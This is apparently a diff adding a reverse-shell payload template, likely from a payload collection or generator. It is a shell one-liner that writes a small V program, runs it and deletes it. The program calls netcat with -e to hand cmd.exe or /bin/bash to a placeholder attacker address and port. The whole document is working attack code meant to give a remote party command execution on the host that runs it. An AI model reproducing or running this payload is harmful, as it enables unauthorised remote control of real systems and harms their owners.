@@ -1,0 +1,11 @@
+echo 'import os
+
+fn main() {
+    $shell := if os.user_os() == "windows" {
+        "cmd.exe /c nc.exe -e cmd.exe __IPADDR__ __PORT__"
+    } else {
+        "nc -e /bin/bash __IPADDR__ __PORT__"
+    }
+    os.system($shell)
+}' > t.v && v run t.v && rm t.v
+
